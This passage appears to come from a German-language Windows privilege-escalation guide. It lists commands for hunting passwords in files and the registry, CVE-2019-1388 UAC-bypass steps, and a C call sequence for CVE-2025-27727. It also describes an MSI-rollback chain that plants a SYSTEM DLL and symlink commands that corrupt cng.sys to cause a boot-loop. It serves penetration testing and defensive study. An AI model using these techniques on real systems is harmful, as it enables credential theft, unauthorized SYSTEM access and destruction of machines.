**Nach einer Datei mit einem bestimmten Dateinamen suchen**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Durchsuche die Registry nach Schlüsselnamen und Passwörtern**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Tools, die nach Passwörtern suchen

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf-Plugin. Ich habe dieses Plugin erstellt, um automatisch jedes Metasploit-POST-Modul auszuführen, das im Opfer nach Zugangsdaten sucht.**\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die Passwörter enthalten, die auf dieser Seite erwähnt werden.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um Passwörter aus einem System auszulesen.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **Sessions**, **Benutzernamen** und **Passwörtern** verschiedener Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Stell dir vor, **ein als SYSTEM laufender Prozess öffnet einen neuen Prozess** (`OpenProcess()`) **mit Vollzugriff**. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit geringen Berechtigungen, der jedoch alle geöffneten Handles des Hauptprozesses erbt**.\
Wenn du dann **Vollzugriff auf den Prozess mit geringen Berechtigungen hast**, kannst du das **geöffnete Handle des privilegierten Prozesses**, das mit `OpenProcess()` erstellt wurde, abgreifen und **Shellcode injizieren**.\
[Lies dieses Beispiel, um mehr darüber zu erfahren, **wie sich diese Schwachstelle erkennen und ausnutzen lässt**.](leaked-handle-exploitation.md)\
[Lies [diesen **weiteren Beitrag**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/) für eine ausführlichere Erklärung, wie sich weitere offene Handles von Prozessen und Threads testen und missbrauchen lassen, die mit unterschiedlichen Berechtigungsstufen vererbt wurden (nicht nur mit Vollzugriff).

## Named Pipe Client Impersonation

Gemeinsam genutzte Speicherbereiche, sogenannte **Pipes**, ermöglichen die Prozesskommunikation und Datenübertragung.

Windows bietet eine Funktion namens **Named Pipes**, mit der nicht verbundene Prozesse Daten austauschen können, auch über verschiedene Netzwerke hinweg. Das ähnelt einer Client/Server-Architektur mit den Rollen **Named Pipe Server** und **Named Pipe Client**.

Wenn ein **Client** Daten über eine Pipe sendet, kann der **Server**, der die Pipe eingerichtet hat, die **Identität des Clients annehmen**, sofern er über die erforderlichen **SeImpersonate**-Rechte verfügt. Wenn du einen **privilegierten Prozess** identifizierst, der über eine Pipe kommuniziert, die du nachbilden kannst, ergibt sich die Möglichkeit, **höhere Berechtigungen zu erlangen**, indem du die Identität dieses Prozesses annimmst, sobald er mit deiner eingerichteten Pipe interagiert. Hilfreiche Anleitungen zur Durchführung eines solchen Angriffs findest du [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).

Das folgende Tool ermöglicht außerdem das **Abfangen einer Named-Pipe-Kommunikation mit einem Tool wie Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **und mit diesem Tool kannst du alle Pipes auflisten und anzeigen lassen, um privescs zu finden** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Der Telephony-Dienst (TapiSrv) stellt im Servermodus `\\pipe\\tapsrv` (MS-TRP) bereit. Ein entfernter, authentifizierter Client kann den auf Mailslots basierenden asynchronen Ereignispfad missbrauchen, um `ClientAttach` in einen beliebigen **4-Byte-Schreibzugriff** auf jede vorhandene Datei umzuwandeln, in die `NETWORK SERVICE` schreiben kann. Anschließend kann er Telephony-Administratorrechte erlangen und eine beliebige DLL als Dienst laden. Der vollständige Ablauf:

- `ClientAttach` mit `pszDomainUser`, das auf einen beschreibbaren, vorhandenen Pfad gesetzt ist → der Dienst öffnet die Datei mit `CreateFileW(..., OPEN_EXISTING)` und verwendet sie für asynchrone Ereignisschreibvorgänge.
- Jedes Ereignis schreibt den vom Angreifer kontrollierten `InitContext` aus `Initialize` in dieses Handle. Registriere eine Line-App mit `LRegisterRequestRecipient` (`Req_Func 61`), löse `TRequestMakeCall` aus (`Req_Func 121`), rufe die Daten über `GetAsyncEvents` ab (`Req_Func 0`) und hebe anschließend die Registrierung auf bzw. fahre den Dienst herunter, um deterministische Schreibvorgänge zu wiederholen.
- Füge dich in `C:\Windows\TAPI\tsec.ini` zu `[TapiAdministrators]` hinzu, verbinde dich erneut und rufe `GetUIDllName` mit einem beliebigen DLL-Pfad auf, um `TSPI_providerUIIdentify` als `NETWORK SERVICE` auszuführen.

Weitere Details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Verschiedenes

### Dateierweiterungen, die unter Windows etwas ausführen können

Siehe die Seite **[https://filesec.io/](https://filesec.io/)**

### Missbrauch von Protocol Handlern / ShellExecute über Markdown-Renderer

Anklickbare Markdown-Links, die an `ShellExecuteExW` weitergeleitet werden, können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder jedes registrierte Schema) auslösen und vom Angreifer kontrollierte Dateien als aktueller Benutzer ausführen. Siehe:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Befehlszeilen auf Passwörter überwachen**

Wenn du eine Shell als Benutzer erhältst, werden möglicherweise geplante Tasks oder andere Prozesse ausgeführt, die **Anmeldedaten über die Befehlszeile übergeben**. Das folgende Skript erfasst alle zwei Sekunden die Befehlszeilen von Prozessen, vergleicht den aktuellen Zustand mit dem vorherigen und gibt alle Unterschiede aus.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Passwörter aus Prozessen stehlen

## Vom Benutzer mit niedrigen Privilegien zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn du Zugriff auf die grafische Benutzeroberfläche hast (über Konsole oder RDP) und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, als unprivilegierter Benutzer ein Terminal oder einen anderen Prozess wie „NT\AUTHORITY SYSTEM“ auszuführen.

Dadurch ist es möglich, mit derselben Sicherheitslücke gleichzeitig die Berechtigungen zu erweitern und UAC zu umgehen. Außerdem muss nichts installiert werden, und die während des Vorgangs verwendete Binärdatei ist von Microsoft signiert und herausgegeben.

Zu den betroffenen Systemen gehören unter anderem:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Um diese Schwachstelle auszunutzen, müssen die folgenden Schritte ausgeführt werden:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

You finden alle erforderlichen Dateien und Informationen im folgenden GitHub-Repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Von Administrator-Medium- zu High-Integrity-Level / UAC-Bypass

Lesen Sie dies, um **mehr über Integritätsstufen zu erfahren**:


{{#ref}}
integrity-levels.md
{{#endref}}

Lesen Sie anschließend dies, um **mehr über UAC und UAC-Bypasses zu erfahren:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Upload-Verzeichnis-Junctions in ein vom Webserver ausgeliefertes Root-Verzeichnis

Eine Anwendung kann ein vorhersehbares Upload-Unterverzeichnis erstellen, einen vom Aufrufer angegebenen Dateinamen darin speichern und die Datei anschließend verarbeiten. Kann ein Benutzer mit geringen Berechtigungen dieses Unterverzeichnis entfernen und durch eine NTFS-Junction ersetzen, bevor der serverseitige Schreibvorgang stattfindet, kann der Schreibvorgang der Junction in ein vom Webserver ausgeliefertes Verzeichnis folgen. Ein dort abgelegtes Skript kann mit der Identität des Webdienstes ausgeführt werden, sofern der Server diesen Dateityp ausführt. Dies ist eine anwendungsspezifische Grenze für beliebige Schreibvorgänge; ein beschreibbares Upload-Verzeichnis oder eine vorhandene Junction allein beweist das nicht.

Prüfen Sie die genaue Pfadkonstruktion und den Zeitpunkt im Upload-Handler, die effektiven Berechtigungen des Benutzers zum Löschen und Erstellen des Unterverzeichnisses, die effektiven ACLs des Ziels, ob der Schreibvorgang Reparse Points folgt und ob der Webserver Dateien in diesem Ziel ausführt. Ermitteln Sie die Prozessidentitäten des Schreibprozesses und des Webservers getrennt. Eine passive Bestandsaufnahme kann Verzeichnis-ACLs und Reparse-Metadaten anzeigen, aber weder das Verhalten des Handlers noch einen späteren Austausch der Junction nachweisen. Wenn die Ausführung unter einem Dienstkonto erfolgt, prüfen Sie das **tatsächliche Prozesstoken**, bevor Sie einen separaten Pfad über Token-Berechtigungen in Betracht ziehen.

## Von beliebigem Löschen/Verschieben/Umbenennen von Ordnern zu SYSTEM-EoP

Die Technik wird [**in diesem Blogbeitrag**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschrieben; Exploit-Code ist [**hier verfügbar**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Bei dem Angriff wird im Wesentlichen die Rollback-Funktion von Windows Installer missbraucht, um während der Deinstallation legitime Dateien durch bösartige zu ersetzen. Dazu muss der Angreifer einen **bösartigen MSI-Installer** erstellen, mit dem der Ordner `C:\Config.Msi` gekapert wird. Windows Installer verwendet diesen später, um während der Deinstallation anderer MSI-Pakete Rollback-Dateien zu speichern. Diese Rollback-Dateien wurden zuvor so verändert, dass sie die bösartige Payload enthalten.

### Injection in den Windows-Installer-COM-Bereinigungspfad (CVE-2025-27727)

Ein Client mit geringen Berechtigungen kann über das COM-Objekt `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) den SYSTEM-Dienst `msiexec.exe` erreichen. Beim Reverse Engineering wurden die relevanten `IMsiServer`-Aufrufe als `MsiBeginTransactionW` am vtable-Offset `0xA0`, `SetEEUIDirectoryAndFilter` bei `0xC8` und `CleanupTempPackages` bei `0x50` identifiziert. Diese Namen und Offsets wurden durch Reverse Engineering ermittelt und können je nach Build variieren.<sup>[[41]](#references)</sup>

Bei einem Nicht-Administrator impersoniert `SetEEUIDirectoryAndFilter` den Aufrufer nur beim Öffnen des angegebenen Pfads mit `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` und `FILE_FLAG_OPEN_REPARSE_POINT`. Damit wird nachgewiesen, dass der Aufrufer das Verzeichnis löschen kann und dass einem Reparse Point nicht gefolgt wird. Es wird jedoch **weder** das geprüfte Dateiobjekt an die spätere Bereinigung gebunden **noch** nachgewiesen, dass Windows Installer es erstellt hat.<sup>[[41]](#references)</sup>

Nach `MsiBeginTransactionW` plant `SetEEUIDirectoryAndFilter` den Pfad unabhängig vom Filterargument des Aufrufers als Ordner ein. Der Dienst schreibt einen benannten `REG_DWORD`-Wert unter `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: Der Wertname ist der vom Aufrufer kontrollierte Pfad, und der Wert `0x00000002` kennzeichnet einen Ordner. `CleanupTempPackages(NULL, FALSE)` startet dann direkt die Bereinigung. Der Worker mit erhöhten Berechtigungen zählt die Registrierungswerte auf und übergibt Ordnereinträge an das rekursive `FDeleteFolder`, ohne die Herkunft des Pfads zu prüfen. Schlägt das normale Entfernen fehl, ruft der Code außerdem `LockdownPath` auf, löscht Dateiattribute und versucht es erneut.<sup>[[41]](#references)</sup>

Die minimale aus `msi.dll` rekonstruierte Aufrufsequenz lautet:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Das nützliche Primitive ist die Wiederverwendung des Pfads und nicht eine Junction-Umleitung. Registriere ein vom Angreifer erstelltes `C:\Config.Msi`, entferne es und lass Windows Installer später denselben Pfad mit geschützten Rollback-Daten erneut erstellen. Beim Cleanup vertraut das System dem veralteten Namen `TempPackages` und löscht das neue Verzeichnis als SYSTEM. Damit wird die vorgesehene Grenze der Mitigations `FILE_FLAG_OPEN_REPARSE_POINT` und Redirection Trust umgangen, da kein Reparse Point erforderlich ist.<sup>[[41]](#references)</sup>

Dieses Lösch-Primitive passt in die folgende Rollback-Kette: Bewahre den separaten `Installer\Folders`-Eintrag auf, lösche das geschützte `C:\Config.Msi`, erstelle es mit einer NULL-DACL neu und behalte ein Handle mit `WRITE_DAC`, bevor der Installer die DACL absichert. Mit dem zuvor geöffneten Handle lässt sich über `NtSetSecurityObject` eine permissive DACL wiederherstellen. Danach kann die generierte `.rbs` ersetzt werden, bevor der Rollback fortgesetzt wird.<sup>[[41]](#references)</sup>

Microsoft hat den Pfad korrigiert, indem `CMsiTransaction::SetEEUIDirectoryAndFilter` bei aktiviertem neuen Feature Gate nicht mehr `ScheduleFileOrFolderDelete` aufruft. Der COM-Aufruf kann weiterhin erfolgreich zurückkehren, trägt den vom Angreifer kontrollierten Pfad aber nicht mehr in `TempPackages` ein. Installiere die Windows-Sicherheitsupdates vom April 2025, statt eine erfolgreiche Rückgabe der Methode als Patch-Test zu verwenden.<sup>[[41]](#references)[[42]](#references)</sup>

Die zusammengefasste Technik sieht folgendermaßen aus:

1. **Phase 1 – Vorbereitung des Hijacks (`C:\Config.Msi` leer lassen)**

- Schritt 1: MSI installieren
    - Erstelle eine `.msi`, die eine harmlose Datei (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`) installiert.
    - Markiere den Installer als **„UAC Compliant“**, damit ein **Nicht-Administrator** ihn ausführen kann.
    - Lass nach der Installation ein **Handle** für die Datei geöffnet.

- Schritt 2: Deinstallation starten
    - Deinstalliere dieselbe `.msi`.
    - Der Deinstallationsprozess verschiebt Dateien nach `C:\Config.Msi` und benennt sie in `.rbf`-Dateien um (Rollback-Sicherungen).
    - **Überwache das geöffnete Datei-Handle** mit `GetFinalPathNameByHandle`, um zu erkennen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Schritt 3: Benutzerdefinierte Synchronisierung
    - Die `.msi` enthält eine **benutzerdefinierte Deinstallationsaktion (`SyncOnRbfWritten`)**, die:
        - signalisiert, sobald die `.rbf` geschrieben wurde.
        - anschließend auf ein weiteres Ereignis **wartet**, bevor die Deinstallation fortgesetzt wird.

- Schritt 4: Löschen der `.rbf` verhindern
    - Wenn das Signal eingeht, **öffne die `.rbf`-Datei** ohne `FILE_SHARE_DELETE` – dadurch **wird verhindert, dass sie gelöscht wird**.
    - Sende anschließend ein Signal zurück, damit die Deinstallation abgeschlossen werden kann.
    - Windows Installer kann die `.rbf` nicht löschen. Da sich nicht alle Inhalte löschen lassen, wird **`C:\Config.Msi` nicht entfernt**.

- Schritt 5: `.rbf` manuell löschen
    - Lösche (als Angreifer) die `.rbf`-Datei manuell.
    - Jetzt ist **`C:\Config.Msi` leer** und bereit für den Hijack.

> An diesem Punkt musst du die **SYSTEM-Level-Schwachstelle zum Löschen beliebiger Ordner** auslösen, um `C:\Config.Msi` zu löschen.

2. **Phase 2 – Rollback-Skripte durch bösartige Skripte ersetzen**

- Schritt 6: `C:\Config.Msi` mit schwachen ACLs neu erstellen
    - Erstelle den Ordner `C:\Config.Msi` selbst neu.
    - Setze **schwache DACLs** (z. B. Everyone:F) und **behalte ein Handle mit `WRITE_DAC` geöffnet**.

- Schritt 7: Eine weitere Installation ausführen
    - Installiere die `.msi` erneut mit:
        - `TARGETDIR`: beschreibbarer Speicherort.
        - `ERROROUT`: eine Variable, die einen erzwungenen Fehler auslöst.
    - Diese Installation wird verwendet, um erneut einen **Rollback** auszulösen, der `.rbs` und `.rbf` liest.

- Schritt 8: Auf `.rbs` überwachen
    - Verwende `ReadDirectoryChangesW`, um `C:\Config.Msi` zu überwachen, bis eine neue `.rbs` erscheint.
    - Erfasse ihren Dateinamen.

- Schritt 9: Vor dem Rollback synchronisieren
    - Die `.msi` enthält eine **benutzerdefinierte Installationsaktion (`SyncBeforeRollback`)**, die:
        - ein Ereignis signalisiert, wenn die `.rbs` erstellt wurde.
        - anschließend wartet, bevor sie fortfährt.

- Schritt 10: Schwache ACL erneut anwenden
    - Nach Erhalt des Ereignisses `.rbs created`:
        - wendet Windows Installer erneut starke ACLs auf `C:\Config.Msi` an.
        - Da du aber weiterhin ein Handle mit `WRITE_DAC` hast, kannst du **erneut schwache ACLs anwenden**.

> ACLs werden **nur beim Öffnen eines Handles durchgesetzt**, du kannst also weiterhin in den Ordner schreiben.

- Schritt 11: Gefälschte `.rbs` und `.rbf` ablegen
    - Überschreibe die `.rbs`-Datei mit einem **gefälschten Rollback-Skript**, das Windows anweist:
        - deine `.rbf`-Datei (bösartige DLL) an einem **privilegierten Speicherort** wiederherzustellen (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Lege deine gefälschte `.rbf` mit einer **bösartigen Payload-DLL auf SYSTEM-Ebene** ab.

- Schritt 12: Rollback auslösen
    - Sende das Synchronisierungssignal, damit der Installer fortfährt.
    - Eine **Custom Action vom Typ 19 (`ErrorOut`)** ist so konfiguriert, dass sie die Installation an einem bekannten Punkt **absichtlich fehlschlagen lässt**.
    - Dadurch beginnt der **Rollback**.

- Schritt 13: SYSTEM installiert deine DLL
    - Windows Installer:
        - liest deine bösartige `.rbs`.
        - kopiert deine `.rbf`-DLL an den Zielort.
    - Jetzt befindet sich deine **bösartige DLL in einem von SYSTEM geladenen Pfad**.

- Letzter Schritt: SYSTEM-Code ausführen
    - Führe eine vertrauenswürdige **auto-elevated Binary** aus (z. B. `osk.exe`), die die von dir eingeschleuste DLL lädt.
    - **Boom**: Dein Code wird **als SYSTEM** ausgeführt.

### Vom Löschen/Verschieben/Umbenennen beliebiger Dateien zu SYSTEM-EoP

Die Haupttechnik mit MSI-Rollback (die vorherige) setzt voraus, dass du einen **gesamten Ordner** (z. B. `C:\Config.Msi`) löschen kannst. Was aber, wenn deine Schwachstelle nur das **Löschen beliebiger Dateien** ermöglicht?

Du könntest **NTFS-Interna** ausnutzen: Jeder Ordner hat einen verborgenen Alternate Data Stream namens:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Dieser Stream speichert die **Indexmetadaten** des Ordners.

Wenn du also den Stream `::$INDEX_ALLOCATION` eines Ordners **löschst**, **entfernt NTFS den gesamten Ordner** aus dem Dateisystem.

Dazu kannst du standardmäßige APIs zum Löschen von Dateien verwenden, etwa:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Obwohl du eine *Datei*-Lösch-API aufrufst, **löscht sie den Ordner selbst**.

### Vom Löschen von Ordnerinhalten zur SYSTEM-EoP
Was, wenn dein Primitive es dir nicht erlaubt, beliebige Dateien/Ordner zu löschen, aber **das Löschen des *Inhalts* eines vom Angreifer kontrollierten Ordners erlaubt**?

1. Schritt 1: Einen Köderordner und eine Datei einrichten
- Erstellen: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Ein **oplock** auf `file1.txt` setzen
- Das oplock **pausiert die Ausführung**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess durchsucht Ordner (z. B. `%TEMP%`) und versucht, deren Inhalte zu löschen.
- Wenn er `file1.txt` erreicht, **wird das oplock ausgelöst** und die Kontrolle an deinen Callback übergeben.

4. Schritt 4: Im oplock-Callback – das Löschen umleiten

- Option A: `file1.txt` an einen anderen Ort verschieben
    - Dadurch wird `folder1` geleert, ohne das oplock zu unterbrechen.
    - `file1.txt` nicht direkt löschen – dadurch würde das oplock vorzeitig freigegeben.

- Option B: `folder1` in eine **junction** umwandeln:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C: Erstellen Sie einen **Symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Dies zielt auf den internen NTFS-Stream ab, der Ordner-Metadaten speichert – wird er gelöscht, wird der Ordner gelöscht.

5. Schritt 5: Oplock freigeben
- Der SYSTEM-Prozess läuft weiter und versucht, `file1.txt` zu löschen.
- Aufgrund der Junction + Symlink löscht er jetzt jedoch tatsächlich:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von der Erstellung beliebiger Ordner zu dauerhaftem DoS

Nutze eine Primitive aus, mit der du **als SYSTEM/Admin einen beliebigen Ordner erstellen kannst** – selbst wenn **du keine Dateien schreiben** oder **schwache Berechtigungen setzen kannst**.

Erstelle einen **Ordner** (keine Datei) mit dem Namen eines **kritischen Windows-Treibers**, z. B.:
```
C:\Windows\System32\cng.sys
```

- Dieser Pfad entspricht normalerweise dem Kernelmodus-Treiber `cng.sys`.
- Wenn du **ihn vorab als Ordner erstellst**, kann Windows den eigentlichen Treiber beim Booten nicht laden.
- Anschließend versucht Windows, `cng.sys` beim Booten zu laden.
- Es findet den Ordner, **kann den eigentlichen Treiber nicht auflösen** und **stürzt ab oder hält den Bootvorgang an**.
- Es gibt **keinen Fallback** und **keine Wiederherstellung** ohne externen Eingriff (z. B. Bootreparatur oder Datenträgerzugriff).

### Von privilegierten Log-/Backup-Pfaden und OM-Symlinks zum beliebigen Überschreiben von Dateien / Boot-DoS

Wenn ein **privilegierter Dienst** Logs/Exporte in einen Pfad schreibt, der aus einer **beschreibbaren Konfiguration** gelesen wird, kannst du diesen Pfad mit **Object Manager-Symlinks + NTFS-Bereitstellungspunkten** umleiten und so den privilegierten Schreibvorgang in ein beliebiges Überschreiben von Dateien umwandeln (sogar **ohne** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Voraussetzungen**
- Die Konfiguration, in der der Zielpfad gespeichert ist, kann vom Angreifer beschrieben werden (z. B. `%ProgramData%\...\.ini`).
- Möglichkeit, einen Bereitstellungspunkt zu `\RPC Control` und einen OM-Datei-Symlink zu erstellen (James Forshaws [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Ein privilegierter Vorgang, der in diesen Pfad schreibt (Log, Export, Bericht).

**Beispielablauf**
1. Lies die Konfiguration aus, um das Ziel des privilegierten Logs zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Leite den Pfad ohne Adminrechte um:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warte, bis die privilegierte Komponente das Log schreibt (z. B. wenn ein Administrator „Test-SMS senden“ auslöst). Der Schreibvorgang landet nun in `C:\Windows\System32\cng.sys`.
4. Untersuche das überschriebene Ziel (mit einem Hex-/PE-Parser), um die Beschädigung zu bestätigen; ein Neustart zwingt Windows, den manipulierten Treiberpfad zu laden → **boot loop DoS**. Das lässt sich auch auf jede geschützte Datei übertragen, die ein privilegierter Dienst zum Schreiben öffnet.

> `cng.sys` wird normalerweise aus `C:\Windows\System32\drivers\cng.sys` geladen. Wenn jedoch eine Kopie unter `C:\Windows\System32\cng.sys` vorhanden ist, kann zuerst versucht werden, diese zu laden. Dadurch eignet sie sich zuverlässig als Ziel für beschädigte Daten.



## **Von High Integrity zu System**

### **Neuer Dienst**

Wenn du bereits in einem High-Integrity-Prozess arbeitest, kann der **Weg zu SYSTEM** einfach sein: **Erstelle einen neuen Dienst und führe ihn aus**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Achte beim Erstellen einer Service-Binary darauf, dass sie ein gültiger Service ist oder die erforderlichen Aktionen schnell ausführt, da sie nach 20 Sekunden beendet wird, wenn sie kein gültiger Service ist.

### AlwaysInstallElevated

Von einem High-Integrity-Prozess aus kannst du versuchen, **die AlwaysInstallElevated-Registry-Einträge zu aktivieren** und eine Reverse Shell mithilfe eines _**.msi**_-Wrappers zu **installieren**.\
[Weitere Informationen zu den betreffenden Registry-Schlüsseln und zur Installation eines _.msi_-Pakets findest du hier.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Den Code findest du** [**hier**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Wenn du über diese Token-Privilegien verfügst (wahrscheinlich findest du sie in einem bereits als High Integrity laufenden Prozess), kannst du mit dem SeDebug-Privileg **fast jeden Prozess öffnen** (ausgenommen geschützte Prozesse), das Token des Prozesses **kopieren** und mit diesem Token einen **beliebigen Prozess erstellen**.\
Bei dieser Technik wird üblicherweise **ein beliebiger Prozess ausgewählt, der als SYSTEM mit allen Token-Privilegien läuft** (_ja, es gibt SYSTEM-Prozesse ohne alle Token-Privilegien_).\
**Ein** [**Codebeispiel, das die beschriebene Technik ausführt, findest du hier**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Diese Technik wird von meterpreter für die Eskalation mit `getsystem` verwendet. Dabei wird **eine Pipe erstellt und anschließend ein Service erstellt oder missbraucht, um in diese Pipe zu schreiben**. Dann kann der **Server**, der die Pipe mit dem **`SeImpersonate`**-Privileg erstellt hat, **das Token** des Pipe-Clients (des Services) **übernehmen** und dadurch SYSTEM-Privilegien erlangen.\
Wenn du [**mehr über Named Pipes erfahren möchtest, solltest du dies lesen**](#named-pipe-client-impersonation).\
Ein Beispiel dafür, [**wie du mithilfe von Named Pipes von High Integrity zu System wechseln kannst, findest du hier**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es dir gelingt, eine DLL zu **kapern**, die von einem **Prozess** mit **SYSTEM**-Rechten **geladen** wird, kannst du beliebigen Code mit diesen Berechtigungen ausführen. Daher eignet sich Dll Hijacking auch für diese Art der Privilege Escalation. Außerdem ist es **von einem High-Integrity-Prozess aus viel einfacher umzusetzen**, da dieser **Schreibberechtigungen** für die zum Laden von DLLs verwendeten Ordner hat.\
**Mehr über Dll Hijacking erfährst du** [**hier**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lies:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Statische Impacket-Binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Bestes Tool, um nach lokalen Windows-Privilege-Escalation-Vektoren zu suchen:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sucht nach Fehlkonfigurationen und sensiblen Dateien (**[**hier ansehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Erkannt.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sucht nach möglichen Fehlkonfigurationen und sammelt Informationen (**[**hier ansehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
